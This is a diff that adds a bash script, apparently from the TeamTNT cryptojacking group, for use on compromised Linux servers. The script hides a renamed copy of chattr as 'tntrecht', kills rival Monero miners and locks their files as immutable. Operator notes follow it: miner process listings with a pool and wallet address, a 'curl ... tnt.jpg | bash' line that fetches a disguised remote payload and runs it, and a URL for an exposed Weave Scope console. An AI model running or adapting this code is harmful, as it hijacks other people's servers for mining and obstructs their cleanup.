@@ -1,0 +1,77 @@
+#!/bin/bash
+LOCKFILE='IyEvYmluL2Jhc2gKZWNobyAnRm9yYmlkZGVuIGFjdGlvbiAhISEgVGVhbVROVCBpcyB3YXRjaGluZyB5b3UhJw=='
+
+
+
+if [ ! -f /usr/bin/tntrecht ]; then
+chattrbin=`which chattr` 
+cp $chattrbin /usr/bin/tntrecht
+chmod +x /usr/bin/tntrecht
+chmod -x $chattrbin
+tntrecht +i $chattrbin
+fi
+
+
+if [ -f /root/.tmp/xmrig ]; then
+chattr -iR /root/.tmp/
+tntrecht -iR /root/.tmp/
+tmpxmrig=("/root/.tmp/config.json" "/root/.tmp/config_background.json" "/root/.tmp/xmrig.log" "/root/.tmp/miner.sh" "/root/.tmp/xmrig")
+for tmpxmrigfile in ${tmpxmrig[@]}; do
+rm -f $tmpxmrigfile
+pkill -f $tmpxmrigfile
+kill $(pidof $tmpxmrigfile)
+echo $LOCKFILE | base64 -d > $tmpxmrigfile
+chmod +x $tmpxmrigfile
+chattr +i $tmpxmrigfile
+tntrecht +i $tmpxmrigfile
+pkill -f $tmpxmrigfile
+kill $(pidof $tmpxmrigfile)
+killall $tmpxmrigfile
+done
+fi
+
+if [ -f /usr/sbin/cpumon ]; then
+cpumonxmr=("/usr/sbin/cpumon" "/usr/cpu")
+for cpumonfile in ${cpumonxmr[@]}; do
+chattr -i $cpumonfile
+tntrecht -i $cpumonfile
+rm -f $cpumonfile
+pkill -f $cpumonfile
+kill $(pidof $cpumonfile)
+echo $LOCKFILE | base64 -d > $cpumonfile
+chmod +x $cpumonfile
+chattr +i $cpumonfile
+tntrecht +i $cpumonfile
+pkill -f $cpumonfile
+kill $(pidof $cpumonfile)
+killall $cpumonfile
+done
+fi
+
+
+ 
+
+
+
+
+exit
+
+/tmp/kdevtmpfsi
+/var/tmp/kinsing
+/usr/sbin/cpumon -c /usr/cpu -t 1
+ 4257 ?        Ssl  158:08 docker-cache -B --donate-level 1 -o pool.minexmr.com:443 -u 85X7JcgPpwQdZXaK2TKJb8baQAXc3zBsnW7JuY7MLi9VYSamf4bFwa7SEAK9Hgp2P53npV19w1zuaK5bft5m2NN71CmNLoh -k --tls -t 1 -
+ 10946 ?        SNsl 4737:53 /root/.tmp/xmrig --config=/root/.tmp/config.json
+
+chmod -x /usr/bin/docker-cache; chattr +i /usr/bin/docker-cache; tntrecht +i /usr/bin/docker-cache; pkill -f /usr/bin/docker-cache
+
+
+
+chmod -x /root/.tmp/xmrig; rm -f /root/.tmp/xmrig; chattr +i /root/.tmp/xmrig; tntrecht +i /root/.tmp/xmrig; pkill -f /root/.tmp/xmrig; ps ax| grep xmrig
+curl http://healthymiami.com/userimages/tnt.jpg | bash
+
+
+
+
+http://52.139.241.24/#!/state/{%22gridSortedBy%22:%22host_name%22,%22pausedAt%22:%222020-07-18T15:51:44Z%22,%22pinnedMetricType%22:%22Memory%22,%22topologyId%22:%22hosts%22,%22topologyOptions%22:{%22containers%22:{%22namespace%22:[%22%22],%22system%22:[%22all%22]},%22pods%22:{%22namespace%22:[%22%22],%22pseudo%22:[%22hide%22],%22snapshot%22:[%22hide%22],%22storage%22:[%22hide%22]},%22processes%22:{%22unconnected%22:[%22hide%22]}},%22topologyViewMode%22:%22grid%22}
+
+
